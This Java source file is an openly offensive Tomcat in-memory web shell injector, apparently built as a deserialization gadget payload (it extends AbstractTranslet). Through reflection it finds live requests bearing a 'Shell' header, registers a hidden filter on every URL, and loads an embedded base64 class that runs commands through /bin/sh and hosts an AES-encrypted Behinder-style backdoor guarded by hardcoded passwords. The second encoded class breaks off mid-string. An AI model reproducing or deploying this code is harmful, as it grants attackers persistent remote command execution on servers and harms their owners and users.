package com.aurora.Templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import sun.misc.BASE64Decoder;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.List;

public class TomcatMemshellTemplate2 extends AbstractTranslet {

    public TomcatMemshellTemplate2(){
        try{
            boolean var4 = false;
            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");

            for(int var6 = 0; var6 < var5.length; ++var6) {
                Thread var7 = var5[var6];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {
                                continue;
                            }

                            List var9 = (List)getFV(var1, "processors");

                            for(int var10 = 0; var10 < var9.size(); ++var10) {
                                Object var11 = var9.get(var10);
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Shell");
                                if (var3 != null && !var3.isEmpty()) {
                                    try{
                                        injectMemshell(var1);
                                        writeBody(var2, "[+] Memshell Inject Success".getBytes());
                                    }catch(Exception e){
                                        writeBody(var2, "[-] Memshell Inject Failed".getBytes());
                                    }
                                    var4 = true;
                                }

                                if (var4) {
                                    break;
                                }
                            }

                            if (var4) {
                                break;
                            }
                        }
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }

    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static void injectMemshell(Object var1) throws Exception {
        String filterName = "TomcatDynamicFilter-2";
        String urlPattern = "/*";

        Request req = (Request) ((org.apache.coyote.Request)var1).getNote(1);

        // ?????? standardContext
        final ServletContext servletContext = req.getSession().getServletContext();

        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

        field = applicationContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        StandardContext standardContext = (StandardContext) field.get(applicationContext);

        field = standardContext.getClass().getDeclaredField("filterConfigs");
        field.setAccessible(true);
        HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

        if(map.get(filterName) == null) {
            System.out.println("[+] Add Dynamic Filter");

            //?????? FilterDef
            //?????? Tomcat7 ??? Tomcat8 ??? FilterDef ?????????????????????????????????????????????????????????
            Class filterDefClass = null;
            try {
                filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
            } catch (ClassNotFoundException e) {
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            }

            Object filterDef = filterDefClass.newInstance();
            filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class clazz;
            try{
                clazz = cl.loadClass("com.feihong.ldap.template.DynamicFilterTemplate");
            }catch(ClassNotFoundException e){
                BASE64Decoder base64Decoder = new BASE64Decoder();
                String codeClass = "yv66vgAAADIBXgoAQgCnCACoCQBdAKkIAKoJAF0AqwgArAkAXQCtCgBdAK4JAK8AsAgAsQoAsgCzCAC0CwBIALUIALYKABMAtwoAEwC4CQC5ALoIALsHALwIAL0IAL4IAHcIAL8HAMAKAMEAwgoAwQDDCgDEAMUKABgAxggAxwoAGADICgAYAMkLAEkAygoAywCzBwDMCwAiAM0LACIAzggAzwsAIgDQCADRCwDSANMIANQKANUA1gcA1wcA2AoALACnCwDSANkKACwA2ggA2woALADcCgAsAN0KABMA3goAKwDfCgDVAOAHAOEKADYApwsASADiCgDjAOQKADYA5QoA1QDmCQBdAOcIAOgHAOkHAHwHAOoKAD4A6wcA7AoA7QDuCgDtAO8KAPAA8QoAPgDyCADzBwD0BwD1BwD2CgBKAPcLAPgA+QgA+goAQAD7BwD8CgBCAP0JAP4A/wcBAAoAPgEBCAECCgDwAQMKAP4BBAcBBQoAVwD3BwEGCgBZAPcHAQcKAFsA9wcBCAcBCQEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAQYmFzaWNDbWRTaGVsbFB3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAE2JlaGluZGVyU2hlbGxIZWFkZXIBABBiZWhpbmRlclNoZWxsUHdkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADFMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9EeW5hbWljRmlsdGVyVGVtcGxhdGU7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcBCgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQADY21kAQABawEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmlsQ2xhc3MBAApldmlsT2JqZWN0AQASTGphdmEvbGFuZy9PYmplY3Q7AQAMdGFyZ2V0TWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAA1TdGFja01hcFRhYmxlBwC8BwB1BwD2AQAHZGVzdHJveQEACmluaXRpYWxpemUBAAJleAEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABWNsYXp6AQAGbWV0aG9kAQAEY29kZQEABWJ5dGVzAQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb247BwEIBwDqBwD8BwDpBwELBwEABwEFBwEGBwEHAQAKU291cmNlRmlsZQEAGkR5bmFtaWNGaWx0ZXJUZW1wbGF0ZS5qYXZhDABlAGYBAARwYXNzDABhAGIBAAxYLU9wdGlvbnMtQWkMAGMAYgEAEGU0NWUzMjlmZWI1ZDkyNWIMAGQAYgwAjwBmBwEMDAENAQ4BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcBDwwBEAERAQAEdHlwZQwBEgETAQAFYmFzaWMMAPMBFAwBFQEWBwEXDAEYAGIBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHARkMARoBGwwBHAEdBwEeDAEfASAMAGUBIQEAAlxBDAEiASMMASQBJQwBJgEnBwEoAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwBKQETDAEqASUBAARQT1NUDAErASwBAAF1BwEtDAEuAS8BAANBRVMHATAMATEBMgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBMwE0DAE1ATYBAAAMATUBNwwBOAElDAE5AToMAGUBOwwAbAE8AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwBPQE+BwE/DAFAASUMAUEBQgwBQwFEDABfAGABAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgwBRQFGAQAQamF2YS9sYW5nL09iamVjdAcBRwwBSAFJDAFKAUsHAQsMAUwBTQwBTgFPAQAGZXF1YWxzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBUABmBwFRDAByAVIBACdjb20uZmVpaG9uZy5sZGFwLnRlbXBsYXRlLk15Q2xhc3NMb2FkZXIMAVMBVAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFVAVYHAVcMAVgAYAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAVkBVgEDHHl2NjZ2Z0FBQURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNsTVkyOXRMMlpsYVdodmJtY3ZiR1JoY0M5MFpXMXdiR0YwWlM5TmVVTnNZWE56VEc5aFpHVnlPd0VBQVdNQkFCZE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUMyUmxabWx1WlVOc1lYTnpBUUFzS0Z0Q1RHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFWaWVYUmxjd0VBQWx0Q0FRQUxZMnhoYzNOTWIyRmtaWElCQUFwVGIzVnlZMlZHYVd4bEFRQVNUWGxEYkdGemMweHZZV1JsY2k1cVlYWmhEQUFHQUFjQkFDZGpiMjB2Wm1WcGFHOXVaeTlzWkdGd0wzUmxiWEJzWVhSbEwwMTVRMnhoYzNOTWIyRmtaWElNQUE4QUdnRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUZ5aGJRa2xKS1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QUNFQUFnQUZBQUFBQUFBQ0FBQUFCZ0FIQUFFQUNBQUFBRG9BQWdBQ0FBQUFCaW9ydHdBQnNRQUFBQUlBQ1FBQUFBWUFBUUFBQUFRQUNnQUFBQllBQWdBQUFBWUFDd0FNQUFBQUFBQUdBQTBBRGdBQkFBa0FEd0FRQUFFQUNBQUFBRVFBQkFBQ0FBQUFFTHNBQWxrcnR3QURLZ01xdnJZQUJMQUFBQUFDQUFrQUFBQUdBQUVBQUFBSUFBb0FBQUFXQUFJQUFBQVFBQkVBRWdBQUFBQUFFQUFUQUE0QUFRQUJBQlFBQUFBQ0FCVT0MAVoBWwwBXAFdAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAL2NvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAF0AQgABAF4ABAACAF8AYAAAAAIAYQBiAAAAAgBjAGIAAAACAGQAYgAAAAUAAQBlAGYAAQBnAAAAWQACAAEAAAAbKrcAASoSArUAAyoSBLUABSoSBrUAByq3AAixAAAAAgBoAAAAGgAGAAAAFgAEABEACgASABAAEwAWABcAGgAYAGkAAAAMAAEAAAAbAGoAawAAAAEAbABtAAIAZwAAADUAAAACAAAAAbEAAAACAGgAAAAGAAEAAAAdAGkAAAAWAAIAAAABAGoAawAAAAAAAQBuAG8AAQBwAAAABAABAHEAAQByAHMAAgBnAAAC5AAHAAoAAAGpsgAJEgq2AAsrEgy5AA0CAMYAkSsSDLkADQIAEg62AA+ZAIErKrQAA7kADQIAOgQZBMYAbRkEtgAQmgBlAToFsgAREhK2AA+ZABsGvQATWQMSFFNZBBIVU1kFGQRTOgWnABgGvQATWQMSFlNZBBIXU1kFGQRTOgW7ABhZuAAZGQW2ABq2ABu3ABwSHbYAHrYAHzoGLLkAIAEAGQa2ACGnAQorwAAiKrQABbkAIwIAxgDyK8AAIrkAJAEAEiW2AA+ZANQqtAAHOgQrwAAiuQAmAQASJxkEuQAoAwASKbgAKjoFGQUFuwArWbsALFm3AC0rwAAiuQAmAQASJ7kALgIAtgAvEjC2ADG2ADK2ADMSKbcANLYANRkFuwA2WbcANyu5ADgBALYAObYAOrYAOzoGKrQAPBI9Bb0APlkDEj9TWQQSQFO2AEEBBb0AQlkDGQZTWQS4AEO2AERTtgBFwAA+OgcZB7YARjoIGQcSRwW9AD5ZAxJIU1kEEklTtgBBOgkZCRkIBb0AQlkDK1NZBCxTtgBFV6cAFToEGQS2AEunAAstKyy5AEwDALEAAQCxAZMBlgBKAAMAaAAAAG4AGwAAACEACAAkACMAJgAvACcAPAAoAD8AKQBKACoAYgAsAHcALgCTAC8AngAxALEANADCADUAyAA2ANoANwDhADgBFQA5AS8AOgFhADsBaAA8AX8APQGTAEEBlgA/AZgAQAGdAEEBoABDAagARQBpAAAAjgAOAD8AXwB0AHUABQCTAAsAdgBiAAYALwBvAHcAYgAEAMgAywB4AGIABADhALIAeQB6AAUBLwBkAHsAfAAGAWEAMgB9AGAABwFoACsAfgB/AAgBfwAUAIAAgQAJAZgABQCCAIMABAAAAakAagBrAAAAAAGpAIQAhQABAAABqQCGAIcAAgAAAakAiACJAAMAigAAABkACP0AYgcAiwcAjBT5ACYC+wDxQgcAjQkHAHAAAAAGAAIAWQBxAAEAjgBmAAEAZwAAACsAAAABAAAAAbEAAAACAGgAAAAGAAEAAABKAGkAAAAMAAEAAAABAGoAawAAAAIAjwBmAAEAZwAAAgMABwAHAAAAqbgAQ7YAREwqKxJNtgBOtQA8pwB/TSu2AFBOAToEGQTHADMtEkKlAC0tEj0GvQA+WQMSP1NZBLIAUVNZBbIAUVO2AEE6BKf/2DoFLbYAU06n/84SVDoFuwA2WbcANxkFtgA6OgYZBAS2AFUqGQQrBr0AQlkDGQZTWQQDuABWU1kFGQa+uABWU7YARcAAPrUAPKcAGEwrtgBYpwAQTCu2AFqnAAhMK7YAXLEABQAHABEAFABPACgARQBIAFIAAACQAJMAVwAAAJAAmwBZAAAAkACjAFsAAwBoAAAAagAaAAAATgAHAFAAEQBgABQAUQAVAFIAGgBTAB0AVAAoAFYARQBZAEgAVwBKAFgATwBZAFIAXABWAF0AZABeAGoAXwCQAGcAkwBhAJQAYgCYAGcAmwBjAJwAZACgAGcAowBlAKQAZgCoAGgAaQAAAHAACwBKAAUAkACRAAUAGgB2AJIAYAADAB0AcwCTAIEABABWADoAlABiAAUAZAAsAJUAfAAGABUAewCCAJYAAgAHAIkAlwCYAAEAlAAEAIIAmQABAJwABACCAJoAAQCkAAQAggCbAAEAAACpAGoAawAAAIoAAAA6AAn/ABQAAgcAnAcAnQABBwCe/gAIBwCeBwCfBwCgagcAoQn/AD0AAQcAnAAAQgcAokcHAKNHBwCkBAABAKUAAAACAKY=";
                codeClass = "yv66vgAAADIBVgoAQgCkCAClCQBcAKYIAKcJAFwAqAgAqQkAXACqCgBcAKsJAKwArQgArgoArwCwCACxCwBIALIIALMKABMAtAoAEwC1CQC2ALcIALgHALkIALoIALsIAHYIALwHAL0KAL4AvwoAvgDACgDBAMIKABgAwwgAxAoAGADFCgAYAMYLAEkAxwoAyACwBwDJCwAiAMoLACIAywgAzAsAIgDNCADOCwDPANAIANEKANIA0wcA1AcA1QoALACkCwDPANYKACwA1wgA2AoALADZCgAsANoKABMA2woAKwDcCgDSAN0HAN4KADYApAsASADfCgDgAOEKADYA4goA0gDjCQBcAOQIAOUHAOYHAHsHAOcKAD4A6AcA6QoA6gDrCgDqAOwKAO0A7goAPgDvCADwBwDxBwDyBwDzCgBKAPQLAPUA9ggA9woAQAD4BwD5CAD6CQD7APwKAO0A/QoA+wD+BwD/CgBUAPQHAQAKAFYA9AcBAQoAWAD0BwECCgBaAPQHAQMHAQQBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAEGJhc2ljQ21kU2hlbGxQd2QBABJMamF2YS9sYW5nL1N0cmluZzsBABNiZWhpbmRlclNoZWxsSGVhZGVyAQAQYmVoaW5kZXJTaGVsbFB3ZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAxTGNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAQUBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAuQcAdAcA8wEAB2Rlc3Ryb3kBAAppbml0aWFsaXplAQACZXgBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjb2RlAQAFYnl0ZXMBAAZtZXRob2QBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAQMHAOcHAPkHAQYHAP8HAQAHAQEHAQIBAApTb3VyY2VGaWxlAQAaRHluYW1pY0ZpbHRlclRlbXBsYXRlLmphdmEMAGQAZQEABGhhY2sMAGAAYQEADFgtT3B0aW9ucy1BaQwAYgBhAQAQZTQ1ZTMyOWZlYjVkOTI1YgwAYwBhDACOAGUHAQcMAQgBCQEAHVsrXSBEeW5hbWljIEZpbHRlciBzYXlzIGhlbGxvBwEKDAELAQwBAAR0eXBlDAENAQ4BAAViYXNpYwwA8AEPDAEQAREHARIMARMAYQEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcBFAwBFQEWDAEXARgHARkMARoBGwwAZAEcAQACXEEMAR0BHgwBHwEgDAEhASIHASMBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DAEkAQ4MASUBIAEABFBPU1QMASYBJwEAAXUHASgMASkBKgEAA0FFUwcBKwwBLAEtAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEuAS8MATABMQEAAAwBMAEyDAEzASAMATQBNQwAZAE2DABrATcBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAE4ATkHAToMATsBIAwBPAE9DAE+AT8MAF4AXwEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAFAAUEBABBqYXZhL2xhbmcvT2JqZWN0BwFCDAFDAUQMAUUBRgcBBgwBRwFIDAFJAUoBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFLAGUHAUwMAHEBTQEAJ2NvbS5mZWlob25nLmxkYXAudGVtcGxhdGUuTXlDbGFzc0xvYWRlcgwBTgFPAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BAxx5djY2dmdBQUFESUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDbE1ZMjl0TDJabGFXaHZibWN2YkdSaGNDOTBaVzF3YkdGMFpTOU5lVU5zWVhOelRHOWhaR1Z5T3dFQUFXTUJBQmRNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFDMlJsWm1sdVpVTnNZWE56QVFBc0tGdENUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBVmllWFJsY3dFQUFsdENBUUFMWTJ4aGMzTk1iMkZrWlhJQkFBcFRiM1Z5WTJWR2FXeGxBUUFTVFhsRGJHRnpjMHh2WVdSbGNpNXFZWFpoREFBR0FBY0JBQ2RqYjIwdlptVnBhRzl1Wnk5c1pHRndMM1JsYlhCc1lYUmxMMDE1UTJ4aGMzTk1iMkZrWlhJTUFBOEFHZ0VBRldwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNnRUFGeWhiUWtsSktVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FDRUFBZ0FGQUFBQUFBQUNBQUFBQmdBSEFBRUFDQUFBQURvQUFnQUNBQUFBQmlvcnR3QUJzUUFBQUFJQUNRQUFBQVlBQVFBQUFBUUFDZ0FBQUJZQUFnQUFBQVlB